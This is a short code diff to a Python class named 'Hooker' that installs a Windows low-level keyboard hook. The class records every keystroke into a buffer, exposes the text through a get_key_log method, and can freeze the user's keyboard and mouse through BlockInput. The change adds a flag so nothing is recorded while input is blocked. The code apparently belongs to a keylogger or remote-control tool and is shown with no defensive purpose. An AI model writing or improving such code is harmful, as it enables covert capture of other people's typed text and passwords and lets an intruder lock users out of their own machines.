@@ -78,6 +78,7 @@ class Hooker:
         self.user32 = user32
         self.kernel32 = kernel32
         self.is_hooked = None
+        self.is_blocked = False
         self.line = bytearray()
         self.ptr = HOOKPROC(self.hook_procedure)
 
@@ -111,7 +112,7 @@ class Hooker:
             n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, buff, 8 - 1, 0)
             key = wstring_at(buff)  # Key pressed as buffer
 
-            if n >= 0:
+            if n >= 0 and not self.is_blocked:
                 if kb.vkCode not in VIRTUAL_KEYS.values():
                     self.line.extend(bytes(key, "utf8"))
 
@@ -133,10 +134,12 @@ class Hooker:
         print("Stop hook")
 
     def block(self):
-        return user32.BlockInput(True)
+        self.is_blocked = user32.BlockInput(True)
+        return self.is_blocked
 
     def unblock(self):
-        return user32.BlockInput(False)
+        self.is_blocked = not user32.BlockInput(False)
+        return not self.is_blocked
 
     def get_key_log(self):
         temp = str(self.line, "utf8")
